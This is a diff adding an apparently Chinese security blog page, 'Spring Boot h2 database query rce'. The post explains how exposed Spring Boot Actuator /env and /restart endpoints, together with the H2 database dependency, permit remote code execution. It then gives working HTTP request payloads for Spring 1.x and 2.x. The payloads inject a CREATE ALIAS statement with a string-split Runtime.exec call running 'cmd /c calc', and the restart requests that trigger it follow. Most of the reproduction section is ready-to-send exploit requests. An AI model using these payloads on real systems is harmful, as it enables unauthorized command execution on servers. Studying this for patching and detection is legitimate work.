@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Spring Boot h2 database query rce一、漏洞简介H2 database是一款Java内存数据库，多用于单元测试。H2database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权： spring.h2.console.enabled&#x3D;true spring.h2.console.settings.we">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20h2%20database%20query%20rce/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Spring Boot h2 database query rce一、漏洞简介H2 database是一款Java内存数据库，多用于单元测试。H2database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权： spring.h2.console.enabled&#x3D;true spring.h2.console.settings.we">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:03.782Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Spring Boot/Spring Boot h2 database query rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20h2%20database%20query%20rce/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.782Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Spring-Boot-h2-database-query-rce"><a href="#Spring-Boot-h2-database-query-rce" class="headerlink" title="Spring Boot h2 database query rce"></a>Spring Boot h2 database query rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>H2 database是一款Java内存数据库，多用于单元测试。H2<br>database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：</p>
+<pre><code>spring.h2.console.enabled=true
+spring.h2.console.settings.web-allow-others=true
+</code></pre>
+<p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p>
+<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>  可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用（存在<br>  spring-boot-starter-actuator 依赖）</li>
+<li>  存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
+</ul>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ol>
+<li>spring.datasource.hikari.connection-test-query<br> 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
+<li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery<br> 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
+<li> restart 重启应用，会建立新的数据库连接</li>
+<li>如果 SQL<br> 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE<br> 漏洞</li>
+</ol>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="步骤一：设置-spring-datasource-hikari-connection-test-query-属性"><a href="#步骤一：设置-spring-datasource-hikari-connection-test-query-属性" class="headerlink" title="步骤一：设置 spring.datasource.hikari.connection-test-query 属性"></a>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5><blockquote>
+<p>⚠️ 下面payload 中的 &#39;T5&#39; 方法每一次执行命令后都需要更换名称 (如 T6)<br>，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
+</blockquote>
+<p>spring 1.x（无回显执行命令）</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;cmd&#39;,&#39;/c&#39;,&#39;calc&#39;);
+</code></pre>
+<p>spring 2.x（无回显执行命令）</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;cmd&#39;,&#39;/c&#39;,&#39;calc&#39;);&quot;&#125;
+</code></pre>
+<h5 id="步骤二：重启应用"><a href="#步骤二：重启应用" class="headerlink" title="步骤二：重启应用"></a>步骤二：重启应用</h5><p>spring 1.x</p>
+<pre><code>POST /restart
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/restart
+Content-Type: application/json
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20h2%20database%20query%20rce/" data-id="cl5c2qvls00gly8v1b3pxa7rl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20mysql%20jdbc%20deserialization%20rce/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20eureka%20xstream%20deserialization%20rce/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
